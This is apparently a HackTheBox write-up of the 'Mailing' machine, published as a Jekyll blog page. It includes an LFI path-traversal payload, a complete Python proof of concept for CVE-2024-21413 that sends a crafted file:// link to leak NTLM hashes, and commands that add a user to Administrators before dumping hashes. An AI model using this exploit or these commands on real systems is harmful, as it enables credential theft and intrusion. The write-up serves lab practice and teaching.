@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Mailing 4e68e06a4c4f42e4a09aaf379ce5a555 | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Mailing 4e68e06a4c4f42e4a09aaf379ce5a555" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Mailing" />
+<meta property="og:description" content="Mailing" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/11/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/11/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-11T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Mailing 4e68e06a4c4f42e4a09aaf379ce5a555" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-11T16:05:57+00:00","datePublished":"2025-07-11T16:05:57+00:00","description":"Mailing","headline":"Mailing 4e68e06a4c4f42e4a09aaf379ce5a555","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/11/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f.html"},"url":"https://your-site-url/writeups/2025/07/11/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Mailing 4e68e06a4c4f42e4a09aaf379ce5a555</h1>
+  
+  <div class="post-date">
+    Published on 11 Jul 2025
+    
+  </div>
+  
+  <h1 id="mailing">Mailing</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>First at all we started with a port recognition we can see a http server and some services used to sent and receive mails like smtp - imap -pop3</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_1.png" alt="Untitled" /></p>
+
+<p>The web application have some instructions about sent an email but if we want break in we will need something else</p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>We can find there is a vulnerability, the smb service is vulnerable to man in the middle attacks, so we already have a clue about where the river goes</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_2.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_3.png" alt="Untitled" /></p>
+
+<p>Even with this information is not enough for create an attack vector, so let’s dig into the server requests</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_4.png" alt="Untitled" /></p>
+
+<p>Where the instructions are download we have interesting stuff, they are using php to find the file, we can check if we can perform a LFI, we can do this using:</p>
+
+<pre><code class="language-arduino">/../../../../../Windows/System32/drivers/etc/hosts
+</code></pre>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_5.png" alt="Untitled" /></p>
+
+<p>The we searched for the config file of hmailserver on the documentation</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_6.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_7.png" alt="Untitled" /></p>
+
+<p>Then we found an administrator password</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_8.png" alt="Untitled" /></p>
+
+<p>Analyze the hash and find the password using hashcat</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_9.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_10.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_11.png" alt="Untitled" /></p>
+
+<ul>
+  <li>
+    <p>CVE-2024-21413</p>
+
+    <p>Once we have credentials for hmailserver administrator based in the information mentioned before we can try a NTLM attack stealing the hash using another vulnerability CVE-2024-21413</p>
+
+    <p>This vulnerability has some implications like the potential leakage of local NTLM information and a possible RCE.</p>
+
+    <pre><code class="language-arduino">  import smtplib
+  from email.mime.multipart import MIMEMultipart
+  from email.mime.text import MIMEText
+  import argparse
+  import sys
+    
+  BLUE = "\033[94m"
+  GREEN = "\033[92m"
+  RED = "\033[91m"
+  ENDC = "\033[0m"
+    
+  def display_banner():
+      banner = f"""
+  {BLUE}CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
+  Alexander Hagenah / @xaitax / ah@primepage.de{ENDC}
+  """
+      print(banner)
+    
+  def send_email(smtp_server, port, username, password, sender_email, recipient_email, link_url, subject):
+    
+      """Sends an email with both plain text and HTML parts, including advanced features."""
+      msg = MIMEMultipart('alternative')
+      msg['Subject'] = subject
+      msg['From'] = sender_email
+      msg['To'] = recipient_email
+    
+      text = "Please read this email in HTML format."
+        
+      html = f"""\
+      &lt;html&gt;
+      &lt;body&gt;
+          &lt;h1&gt;&lt;a href="file:///{link_url}!poc"&gt;CVE-2024-21413 PoC.&lt;/a&gt;&lt;/h1&gt;
+      &lt;/body&gt;
+      &lt;/html&gt;
+      """
+    
+      part1 = MIMEText(text, 'plain')
+      part2 = MIMEText(html, 'html')
+      msg.attach(part1)
+      msg.attach(part2)
+    
+      try:
+          with smtplib.SMTP(smtp_server, port) as server:
+              server.ehlo()
+              server.starttls()
+              server.ehlo()
+              server.login(username, password)
+              server.sendmail(sender_email, recipient_email, msg.as_string())
+              print(f"{GREEN}✅ Email sent successfully.{ENDC}")
+      except Exception as e:
+          print(f"{RED}❌ Failed to send email: {e}{ENDC}")
+    
+  def main():
+      display_banner()
+      parser = argparse.ArgumentParser(description="PoC for CVE-2024-21413 with SMTP authentication.")
+      parser.add_argument('--server', required=True, help="SMTP server hostname or IP")
+      parser.add_argument('--port', type=int, default=587, help="SMTP server port")
+      parser.add_argument('--username', required=True, help="SMTP server username for authentication")
+      parser.add_argument('--password', required=True, help="SMTP server password for authentication")
+      parser.add_argument('--sender', required=True, help="Sender email address")
+      parser.add_argument('--recipient', required=True, help="Recipient email address")
+      parser.add_argument('--url', required=True, help="Malicious path to include in the email")
+      parser.add_argument('--subject', required=True, help="Email subject")
+    
+      args = parser.parse_args()
+    
+      send_email(args.server, args.port, args.username, args.password, args.sender, args.recipient, args.url, args.subject)
+    
+  if __name__ == "__main__":
+      if len(sys.argv) == 1:
+          display_banner()
+          sys.exit(1)
+      main()
+</code></pre>
+
+    <p>This POC create a malicious hyperlink where once the victim click on the link the hash is send to attacker machine.</p>
+
+    <p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_12.png" alt="Untitled" /></p>
+
+    <p>This exclamation mark is what bypass protected outlook view</p>
+  </li>
+</ul>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_13.png" alt="Untitled" /></p>
+
+<p>The email is sent to Maya which is one of the one presented on the web application</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_14.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_15.png" alt="Untitled" /></p>
+
+<p>The hash is pretty hard to get because we have to be patients waiting for the information. We use responder for start listening on some ports including NTLM port</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_16.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_17.png" alt="Untitled" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>When we got the user flag we can review two python scripts where there is a bot managing mailing we can list programmed tasks on the system using</p>
+
+<pre><code class="language-arduino">schtasks /query /fo LIST /v
+</code></pre>
+
+<p>There we found <code class="language-plaintext highlighter-rouge">soffice.ps1</code> which is a file that executes .odt files bypassing powershell controls so we can be sure that exploiting a vulnerability on LibreOffice carries out a successful privilege escalation.</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_18.png" alt="Untitled" /></p>
+
+<p>On program files we realize there is a LibreOffice service running</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_19.png" alt="Untitled" /></p>
+
+<p>So we created a shell on python and use CVE-2023-2255 to execute it</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_20.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_21.png" alt="Untitled" /></p>
+
+<p>Once we create a shell using the malicious .odt file as it is run by local admin we got a shell as local-admin, but to make this possible we need to find a path where local admin has execute permissions</p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_22.png" alt="Untitled" /></p>
+
+<p>important documents looks to be interesting so we check using the following command</p>
+
+<pre><code class="language-arduino">icacls "name of the directory"
+</code></pre>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_23.png" alt="Untitled" /></p>
+
+<ul>
+  <li>I: Objects metadata is allowed</li>
+  <li>OI: Having the possession of the object is allowed</li>
+  <li>CI: Inheriting from this object is allowed.</li>
+  <li>F: Full control</li>
+  <li>RX: Reading and executing is allowed.</li>
+  <li>M: Modifying is allowed.</li>
+</ul>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_24.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_25.png" alt="Untitled" /></p>
+
+<p>Add maya to Administrator to find the Administrator hash</p>
+
+<div class="language-clojure highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="n">localgroup</span><span class="w"> </span><span class="n">Administradores</span><span class="w"> </span><span class="n">maya</span><span class="w"> </span><span class="n">/add</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Using crackmapexec to dump hashes</p>
+
+<div class="language-clojure highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">--pass-pol</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">support</span><span class="w"> </span><span class="nb">time</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">crackmapexec</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_26.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_27.png" alt="Untitled" /></p>
+
+<p>Machine pwned!!!</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/11/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f.html';
+     this.page.identifier = '/writeups/2025/07/11/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f';
+     this.page.title = 'Mailing 4e68e06a4c4f42e4a09aaf379ce5a555';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
